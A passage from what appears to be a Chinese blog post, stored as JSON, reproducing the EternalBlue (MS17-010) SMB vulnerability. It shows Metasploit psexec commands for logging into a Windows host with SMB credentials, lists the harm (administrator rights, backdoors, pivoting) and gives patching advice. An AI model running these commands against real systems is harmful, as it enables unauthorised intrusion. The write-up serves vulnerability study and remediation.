urces/b2c5c0a4e61947149e6c4265842332e1.jpg\"></p>\n<p><strong>4、利用SMB账号密码登录</strong></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>set rhost 192.168.1.1<br>set smbuser admin<br>set smbpass Password<br>exploit</p></blockquote>\n<p><img src=\"/resources/0f0fac42c2014048a541edb57645aaa4.jpg\"></p>\n<p><strong>5、漏洞危害</strong></p>\n<ol>\n<li><p>可以非常容易的取得操作系统 administrator 权限，进行服务管理、文件管理；</p>\n</li>\n<li><p>植入后门、跳板利用，进一步渗透。</p>\n</li>\n</ol>\n<h3 id=\"四、修复方法\"><a href=\"#四、修复方法\" class=\"headerlink\" title=\"四、修复方法\"></a><strong>四、修复方法</strong></h3><p>1、使用系统自带的windows update补丁更新服务，更新微软漏洞补丁（慢）；</p>\n<p>2、使用360 、腾讯管家等工具修复漏洞（建议）；</p>\n<p>如长期未更新过，可能需要 <strong>更新完、重启、再更新、再重启，操作多次</strong> ，因为有些补丁有依赖关系。</p>\n<p>3、Windows系统MS17-010补丁下载，下载对应的补丁更新。</p>\n<p><a href=\"https://net.usst.edu.cn/2019/0508/c6856a143540/page.htm\">https://net.usst.edu.cn/2019/0508/c6856a143540/page.htm</a></p>\n","text":"一、漏洞描述 Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Window...","permalink":"/post/8bd732e67e204765821489d9778086ee","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"漏洞复现及验证","slug":"漏洞复现及验证","count":35,"path":"api/categories/漏洞复现及验证.json"},{"name":"2021年","slug":"漏洞复现及验证/2021年","count":24,"path":"api/categories/漏洞复现及验证/2021年.json"}],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0\"><span class=\"toc-text\">一、漏洞描述</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E3%80%81%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC\"><span class=\"toc-text\">二、影响版本</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%89%E3%80%81%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B\"><span class=\"toc-text\">三、复现过程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1%E3%80%81%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">1、测试环境</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2%E3%80%81%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0\"><span class=\"toc-text\">2、主机发现</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3%E3%80%81%E4%BD%BF%E7%94%A8